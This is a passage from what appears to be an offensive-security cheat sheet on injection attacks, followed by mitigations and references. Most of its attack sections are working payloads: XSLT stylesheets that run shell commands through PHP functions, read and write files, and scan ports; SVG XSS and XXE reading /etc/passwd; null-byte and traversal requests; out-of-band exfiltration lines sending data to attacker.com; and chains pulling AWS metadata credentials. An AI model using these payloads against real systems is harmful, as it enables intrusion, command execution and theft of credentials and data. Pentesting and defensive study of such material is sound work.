<xsl:value-of select="php:function('readdir')"/> -
</xsl:template>
</xsl:stylesheet>
```

**Assert + var_dump + scandir:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
</body>
</html>
```

#### SSRF

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

**Port scanning:**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="document('http://target.com:22')"/>
</xsl:template>
</xsl:stylesheet>
```

#### Write File

**XSLT 2.0:**

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>
</xsl:template>
</xsl:stylesheet>
```

**Xalan-J extension:**

```xml
<xsl:template match="/">
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt">Write Local File</redirect:write>
<redirect:close file="local_file.txt"/>
</xsl:template>
```

#### Command Execution

**PHP shell_exec:**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','whoami')" />
</xsl:template>
</xsl:stylesheet>
```

**PHP assert:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:copy-of name="asd" select="php:function('assert','system(chr(105).chr(100));')" />
</body>
</html>
```

#### XSS

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("XSS");</script>
</xsl:template>
</xsl:stylesheet>
```

#### Include External XSL

```xml
<xsl:include href="http://attacker.com/external.xsl"/>
```

```xml
<?xml version="1.0" ?>
<?xml-stylesheet type="text/xsl" href="http://attacker.com/ext.xsl"?>
```

#### Access PHP Static Methods

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
<xsl:template match="root">
<html>
<xsl:value-of select="php:function('XSL::stringToUrl','test-string')" />
</html>
</xsl:template>
</xsl:stylesheet>
```

### XSLT Versions

- [XSLT 1.0](https://www.w3.org/TR/xslt-10/)
- [XSLT 2.0](https://www.w3.org/TR/xslt20/)
- [XSLT 3.0](https://www.w3.org/TR/xslt-30/)

---

## 🎯 Phone Number Injections

### Theory

Phone number fields often **append strings** that can be used to inject XSS, SQLi, SSRF payloads, or bypass protections.

### Examples

**XSS in phone field:**

```
+1234567890"><svg/onload=alert(1)>
```

**SQLi:**

```
+1234567890' OR '1'='1
```

**SSRF:**

```
+1234567890http://169.254.169.254/latest/meta-data/
```

**OTP bypass/bruteforce:**

```
+1234567890
+1234567891
+1234567892
... (automate)
```

The application may accept phone numbers with trailing injection payloads due to insufficient validation.

---

## 🎯 SVG Abuse

### Resources

- [SVG Cheatsheet](https://github.com/allanlw/svg-cheatsheet)
- [SVG2Raster Cheatsheet](https://github.com/yuriisanin/svg2raster-cheatsheet)

SVG files can contain:

- **XSS payloads** via `<script>` tags
- **SSRF** via external entity references
- **XXE** via DOCTYPE declarations
- **File inclusion** via `<image>` tags

**Example XSS:**

```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(document.domain)</script>
</svg>
```

**Example XXE:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>
```

---

## 🎯 Null-Byte Injection

### Theory

The **null byte** (`%00`, `\x00`) terminates strings in many languages (C, PHP, etc.). Attackers inject null bytes to bypass extension filters or truncate unwanted suffixes.

### File Access Restriction Bypass

**Scenario:** Application appends `.php` to file paths.

**Attack:**

```
/etc/passwd%00
```

**Result:** Reads `/etc/passwd`, discards `.php`.

### File Upload Restriction Bypass

**Scenario:** Only `.pdf` allowed.

**Attack:** Upload filename:

```
malicious.php%00.pdf
```

**Result:**

1. Application validates `.pdf` extension
2. Null byte truncates string
3. File saved as `malicious.php`

---

## 🎯 Arbitrary File Download

### Theory

Vulnerabilities in **download endpoints** (e.g., `download.php?id=123.php`) can be exploited via:

- **Directory traversal** (`../../../etc/passwd`)
- **Null-byte injection** (`file.txt%00.pdf`)
- **IDOR** (changing `id` parameter)
- **SQLi** in download queries

### Exploitation

**Directory traversal:**

```
GET /download.php?file=../../../etc/passwd
```

**Null-byte bypass:**

```
GET /download.php?file=secret.txt%00.pdf
```

**IDOR:**

```
GET /download.php?id=1  (your file)
GET /download.php?id=2  (victim's file)
```

**SQLi:**

```
GET /download.php?id=1' UNION SELECT password FROM users--
```

---

## ▶ Higher Impact Techniques

### OOB Data Exfiltration

Use **DNS**, **HTTP**, or **SMB** to exfiltrate data when direct responses are unavailable.

**LDAP OOB:**

```
doc(concat("http://attacker.com/", name(/*[1])))
```

**XPath OOB:**

```
doc(concat("http://attacker.com/", encode-for-uri(/users/user[1]/password)))
```

**XSLT OOB:**

```xml
<xsl:value-of select="document(concat('http://attacker.com/', /secret))"/>
```

**Google Sheets OOB:**

```
=IMAGE("https://attacker.com/steal.php?data="&A1)
```

### Chaining Injections

Combine multiple injection types for maximum impact:

1. **RSQL → IDOR → Data Leak**
    
    ```
    /api/users?filter[users]=id=='admin-id' → leak admin data
    ```
    
2. **ESI → XSLT → XXE → RCE**
    
    ```html
    <esi:include src="http://attacker.com/poc.xml" dca="xslt" stylesheet="http://attacker.com/xxe.xsl"/>
    ```
    
3. **LESS → SSRF → Cloud Metadata → AWS Keys**
    
    ```less
    @import (inline) "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role";
    ```
    
4. **ORM Injection → ReDoS → DoS**
    
    ```json
    {"password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
    ```
    

### Privilege Escalation via Filters

**Django ORM:**

```json
{"user__groups__user__is_superuser": true}
```

**RSQL:**

```
filter[companyUsers]=user.role.id=='1'  (admin role)
```

**Prisma ORM:**

```json
{
  "where": {
    "user": {
      "role": {
        "name": "admin"
      }
    }
  }
}
```

---

## ▶ Mitigations

### Input Validation & Sanitization

- **Whitelist** allowed characters/patterns
- **Reject** special characters: `'`, `"`, `;`, `&`, `|`, `*`, `%00`, `<`, `>`
- **Validate** data types (numbers, emails, UUIDs)
- **Limit** input length

### Parameterized Queries & Prepared Statements

- **Never** concatenate user input into queries
- Use **ORM frameworks** with proper escaping (but validate filters!)
- **Parameterize** all database queries

### Least Privilege

- **Database users** should have minimal permissions
- **Application roles** should enforce access control
- **File permissions** should restrict read/write access

### Content Security Policy (CSP)

Prevent XSS from injected scripts:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### Disable Dangerous Features

- **XSLT:** Use `--shell-restricted`, never `--shell-escape`
- **YAML:** Use `SafeConstructor` / SnakeYAML ≥ 2.0
- **XML:** Disable external entities (`DisallowDTD`)
- **LaTeX:** Restrict to safe commands only

### Framework-Specific Protections

**Django ORM:**

```python
# Explicit allow list
Article.objects.filter(Q(title__icontains=safe_input))
```

**Prisma ORM:**

```javascript
// Validate filter keys
const allowedFilters = ['name', 'email'];
if (!allowedFilters.includes(filterKey)) throw new Error('Invalid filter');
```

**RSQL (Ransack 4.0+):**

```ruby
# Explicit allow list
ransackable_attributes = ['name', 'email']
```

**Go JSON:**

```go
decoder.DisallowUnknownFields()
```

**YAML:**

```go
yaml.KnownFields(true)
```

### Output Encoding

- **HTML encode** output: `<` → `&lt;`
- **URL encode** parameters
- **JSON encode** responses
- **Escape** special characters in XML/CSV

### Security Headers

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

### Regular Updates

- Keep **libraries/frameworks** up-to-date
- Monitor **CVE databases** for known vulnerabilities
- Apply **security patches** promptly

### Logging & Monitoring

- Log **all injection attempts**
- Monitor **anomalous queries** (excessive wildcards, special chars)
- Alert on **privilege escalation** attempts
- Track **failed authentication** patterns

---

## ▶ References & Tools 🔗

### Wordlists & Payloads

- [LDAP Injection Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
- [XPath Injection Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
- [XSLT Injection Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection)
- [CSV Injection Payloads](https://github.com/payloadbox/csv-injection-payloads)
- [SSI/ESI Detection List](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt)
- [XSLT Detection List](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt)

### Automated Tools

- **XPath:** [xcat](https://xcat.readthedocs.io/), [xxxpwn](https://github.com/feakk/xxxpwn), [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
- **LDAP:** Custom Python scripts (see examples above)
- **ORM:** Manual testing + custom scripts
- **XSLT:** Manual testing via Saxon/Xalan

### Documentation

- [OWASP LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
- [OWASP XPath Injection](https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_\(OTG-INPVAL-010\))
- [OWASP RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [W3C XPath Syntax](https://www.w3schools.com/xml/xpath_syntax.asp)
- [W3C XSLT Specifications](https://www.w3.org/TR/xslt-30/)
- [Django ORM Plormbing](https://www.elttam.com/blog/plormbing-your-django-orm/)
- [Prisma ORM Plorming](https://www.elttam.com/blog/plorming-your-primsa-orm/)
- [Ransack Data Exfiltration](https://positive.security/blog/ransack-data-exfiltration)
- [ESI Injection (GoSecure)](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
- [LESS Code Injection (Karma InfoSec)](https://karmainsecurity.com/KIS-2025-04)
- [Go Parser Security Footguns](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/)
- [Apache SSI Documentation](https://httpd.apache.org/docs/current/howto/ssi.html)

### CVE References

- **CVE-2017-12635** – Apache CouchDB LDAP bypass
- **CVE-2022-1471** – SnakeYAML RCE
- **CVE-2024-35325** – libyaml double-free
- **CVE-2024-38517 / CVE-2024-39684** – RapidJSON integer overflow
- **CVE-2020-16250** – HashiCorp Vault XML/JSON confusion
- **CVE-2019-2438** – ESI CRLF injection
- **CVE-2024-58258** – SugarCRM LESS injection